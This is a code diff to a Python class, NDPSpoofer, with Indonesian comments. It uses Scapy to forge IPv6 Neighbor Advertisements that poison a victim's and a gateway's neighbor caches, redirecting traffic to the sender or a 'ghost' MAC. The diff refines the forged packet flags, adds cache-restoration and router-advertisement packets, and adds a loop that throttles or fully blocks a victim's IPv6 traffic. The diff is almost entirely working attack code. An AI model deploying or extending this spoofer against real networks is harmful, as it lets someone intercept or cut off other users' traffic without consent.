@@ -105,19 +105,21 @@ class NDPSpoofer:
         lla = poison_mac or self_mac
 
         # 1. NA ke Korban: Gateway IPv6 dipetakan ke LLA (self/hantu)
+        # RFC 4861 Sec 4.4: Unsolicited NA WAJIB memiliki flag S=0 (Solicited=0)
         na_victim = (
             Ether(dst=victim_mac, src=self_mac) /
             IPv6(src=clean_gw_ip, dst=clean_vic_ip) /
-            ICMPv6ND_NA(tgt=clean_gw_ip, R=0, S=1, O=1) /
+            ICMPv6ND_NA(tgt=clean_gw_ip, R=0, S=0, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=lla)
         )
         pkts.append(na_victim)
 
         # 2. NA ke Gateway: Korban IPv6 dipetakan ke LLA (self/hantu)
+        # RFC 4861 Sec 4.4: Unsolicited NA WAJIB memiliki flag S=0 (Solicited=0)
         na_gateway = (
             Ether(dst=gateway_mac, src=self_mac) /
             IPv6(src=clean_vic_ip, dst=clean_gw_ip) /
-            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=1, O=1) /
+            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=0, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=lla)
         )
         pkts.append(na_gateway)
@@ -142,29 +144,38 @@ class NDPSpoofer:
         gateway_mac: str
     ) -> List[Any]:
         """
-        Bangun paket restorasi resmi (True MAC) untuk memulihkan cache NDP.
+        Bangun paket restorasi resmi (True MAC) untuk memulihkan cache NDP dan rute default IPv6.
         """
         pkts = []
         clean_vic_ip = victim_ipv6.split('%')[0].strip()
         clean_gw_ip = gateway_ipv6.split('%')[0].strip()
 
-        # Pulihkan Gateway asli ke Korban
+        # 1. Pulihkan Gateway asli ke Korban (Unsolicited NA: S=0, R=1, O=1)
         restore_victim = (
             Ether(dst=victim_mac, src=gateway_mac) /
             IPv6(src=clean_gw_ip, dst=clean_vic_ip) /
-            ICMPv6ND_NA(tgt=clean_gw_ip, R=1, S=1, O=1) /
+            ICMPv6ND_NA(tgt=clean_gw_ip, R=1, S=0, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=gateway_mac)
         )
         pkts.append(restore_victim)
 
-        # Pulihkan Korban asli ke Gateway
+        # 2. Pulihkan Korban asli ke Gateway (Unsolicited NA: S=0, R=0, O=1)
         restore_gateway = (
             Ether(dst=gateway_mac, src=victim_mac) /
             IPv6(src=clean_vic_ip, dst=clean_gw_ip) /
-            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=1, O=1) /
+            ICMPv6ND_NA(tgt=clean_vic_ip, R=0, S=0, O=1) /
             ICMPv6NDOptDstLLAddr(lladdr=victim_mac)
         )
         pkts.append(restore_gateway)
+
+        # 3. Pulihkan Rute Default IPv6 Korban via RA sah (lifetime 1800 detik / 30 menit)
+        # RFC 4861 Sec 6.1.2: RA WAJIB hlim=255
+        restore_ra = (
+            Ether(dst=victim_mac, src=gateway_mac) /
+            IPv6(src=clean_gw_ip, dst="ff02::1", hlim=255) /
+            ICMPv6ND_RA(routerlifetime=1800)
+        )
+        pkts.append(restore_ra)
 
         return pkts
 
@@ -179,6 +190,7 @@ class NDPSpoofer:
             gateway_ipv6 = session['gateway_ipv6']
             gateway_mac = session['gateway_mac']
             blackhole_mac = session.get('blackhole_mac')  # MAC hantu utk mode Gaming
+            speed_limit = session.get('speed_limit', 0)
             iface = self._interface
 
         self_mac = self._self_mac or '00:00:00:00:00:00'
@@ -189,6 +201,7 @@ class NDPSpoofer:
 
         # Periode siklus duty-cycle throttle (selaras dengan spoofer IPv4)
         cycle_period = 1.2
+        was_poisoned = (speed_limit < 100)
 
         while not stop_event.is_set():
             try:
@@ -197,11 +210,19 @@ class NDPSpoofer:
                     s = self._sessions.get(session_id)
                     speed_limit = s.get('speed_limit', 0) if s else 0
 
-                # Mode bebas (>= 100): tidak ada manipulasi IPv6
+                # Mode bebas (>= 100): pulihkan NDP jika sebelumnya teracuni
                 if speed_limit >= 100:
+                    if was_poisoned:
+                        try:
+                            sendp(restore_pkts, iface=iface, verbose=0)
+                        except Exception as e:
+                            logger.debug(f"Unthrottle IPv6 restore notice: {e}")
+                        was_poisoned = False
                     if stop_event.wait(0.5):
                         break
                     continue
+
+                was_poisoned = True
 
                 if speed_limit <= 0:
                     # BLOK PENUH: racun NDP terus-menerus (rute IPv6 di-drop)
